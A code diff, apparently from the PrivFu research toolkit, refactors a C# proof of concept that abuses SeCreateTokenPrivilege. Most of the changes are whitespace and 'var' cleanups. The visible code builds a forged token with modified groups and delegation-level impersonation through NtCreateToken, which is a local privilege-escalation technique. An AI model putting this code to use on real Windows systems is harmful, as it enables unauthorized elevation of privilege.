@@ -361,7 +361,7 @@ namespace SeCreateTokenPrivilegePoC
 
         [DllImport("advapi32.dll")]
         static extern bool LookupPrivilegeValue(
-            IntPtr lpSystemName, 
+            IntPtr lpSystemName,
             string lpName,
             ref LUID lpLuid);
 
@@ -484,7 +484,7 @@ namespace SeCreateTokenPrivilegePoC
             if (!GetCurrentUserSid(out IntPtr pSid))
                 return IntPtr.Zero;
 
-            TOKEN_USER tokenUser = new TOKEN_USER();
+            var tokenUser = new TOKEN_USER();
             tokenUser.User.Attributes = 0;
             tokenUser.User.Sid = pSid;
 
@@ -495,7 +495,7 @@ namespace SeCreateTokenPrivilegePoC
                 return IntPtr.Zero;
             }
 
-            TOKEN_SOURCE tokenSource = new TOKEN_SOURCE("PrivFu!!");
+            var tokenSource = new TOKEN_SOURCE("PrivFu!!");
             tokenSource.SourceIdentifier.LowPart = luid.LowPart;
             tokenSource.SourceIdentifier.HighPart = luid.HighPart;
 
@@ -520,13 +520,13 @@ namespace SeCreateTokenPrivilegePoC
 
             IntPtr hCurrentToken = WindowsIdentity.GetCurrent().Token;
             IntPtr pTokenGroups = GetInformationFromToken(
-                hCurrentToken, 
+                hCurrentToken,
                 TOKEN_INFORMATION_CLASS.TokenGroups);
             IntPtr pTokenPrimaryGroup = GetInformationFromToken(
-                hCurrentToken, 
+                hCurrentToken,
                 TOKEN_INFORMATION_CLASS.TokenPrimaryGroup);
             IntPtr pTokenDefaultDacl = GetInformationFromToken(
-                hCurrentToken, 
+                hCurrentToken,
                 TOKEN_INFORMATION_CLASS.TokenDefaultDacl);
 
             if (pTokenGroups == IntPtr.Zero ||
@@ -537,13 +537,13 @@ namespace SeCreateTokenPrivilegePoC
                 return IntPtr.Zero;
             }
 
-            TOKEN_GROUPS tokenGroups = (TOKEN_GROUPS)Marshal.PtrToStructure(
-                pTokenGroups, 
+            var tokenGroups = (TOKEN_GROUPS)Marshal.PtrToStructure(
+                pTokenGroups,
                 typeof(TOKEN_GROUPS));
-            TOKEN_PRIMARY_GROUP tokenPrimaryGroup = (TOKEN_PRIMARY_GROUP)Marshal.PtrToStructure(
+            var tokenPrimaryGroup = (TOKEN_PRIMARY_GROUP)Marshal.PtrToStructure(
                 pTokenPrimaryGroup,
                 typeof(TOKEN_PRIMARY_GROUP));
-            TOKEN_DEFAULT_DACL tokenDefaultDacl = (TOKEN_DEFAULT_DACL)Marshal.PtrToStructure(
+            var tokenDefaultDacl = (TOKEN_DEFAULT_DACL)Marshal.PtrToStructure(
                 pTokenDefaultDacl,
                 typeof(TOKEN_DEFAULT_DACL));
 
@@ -553,8 +553,8 @@ namespace SeCreateTokenPrivilegePoC
             for (var i = 0; i < tokenGroups.GroupCount; i++)
             {
                 pSidAndAttributes = new IntPtr(pTokenGroups.ToInt64() + i * sidAndAttrSize + IntPtr.Size);
-                SID_AND_ATTRIBUTES sidAndAttributes = (SID_AND_ATTRIBUTES)Marshal.PtrToStructure(
-                    pSidAndAttributes, 
+                var sidAndAttributes = (SID_AND_ATTRIBUTES)Marshal.PtrToStructure(
+                    pSidAndAttributes,
                     typeof(SID_AND_ATTRIBUTES));
 
                 ConvertSidToStringSid(sidAndAttributes.Sid, out var sid);
@@ -578,14 +578,18 @@ namespace SeCreateTokenPrivilegePoC
                 Marshal.StructureToPtr(sidAndAttributes, pSidAndAttributes, true);
             }
 
-            TOKEN_OWNER tokenOwner = new TOKEN_OWNER(pSid);
-            LARGE_INTEGER expirationTime = new LARGE_INTEGER(-1L);
+            tokenGroups = (TOKEN_GROUPS)Marshal.PtrToStructure(
+                pTokenGroups,
+                typeof(TOKEN_GROUPS));
 
-            SECURITY_QUALITY_OF_SERVICE sqos = new SECURITY_QUALITY_OF_SERVICE(
+            var tokenOwner = new TOKEN_OWNER(pSid);
+            var expirationTime = new LARGE_INTEGER(-1L);
+
+            var sqos = new SECURITY_QUALITY_OF_SERVICE(
                 SECURITY_IMPERSONATION_LEVEL.SecurityDelegation, 0, 0);
-            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES(string.Empty, 0);
+            var oa = new OBJECT_ATTRIBUTES(string.Empty, 0);
             IntPtr pSqos = Marshal.AllocHGlobal(Marshal.SizeOf(sqos));
-            Marshal.StructureToPtr(sqos, pSqos, true); 
+            Marshal.StructureToPtr(sqos, pSqos, true);
             oa.SecurityQualityOfService = pSqos;
 
             int ntstatus = NtCreateToken(
@@ -615,7 +619,7 @@ namespace SeCreateTokenPrivilegePoC
 
         static bool GetElevatedPrivileges(out TOKEN_PRIVILEGES tokenPrivileges)
         {
-            LUID luid = new LUID();
+            var luid = new LUID();
             int sizeOfStruct = Marshal.SizeOf(typeof(TOKEN_PRIVILEGES));
             IntPtr pPrivileges = Marshal.AllocHGlobal(sizeOfStruct);
             string[] privs = new string[] {
@@ -626,7 +630,7 @@ namespace SeCreateTokenPrivilegePoC
             };
 
             tokenPrivileges = (TOKEN_PRIVILEGES)Marshal.PtrToStructure(
-                pPrivileges, 
+                pPrivileges,
                 typeof(TOKEN_PRIVILEGES));
             tokenPrivileges.PrivilegeCount = 4;
 
@@ -647,7 +651,7 @@ namespace SeCreateTokenPrivilegePoC
         }
 
         static IntPtr GetInformationFromToken(
-            IntPtr hToken, 
+            IntPtr hToken,
             TOKEN_INFORMATION_CLASS tokenInfoClass)
         {
             bool status;
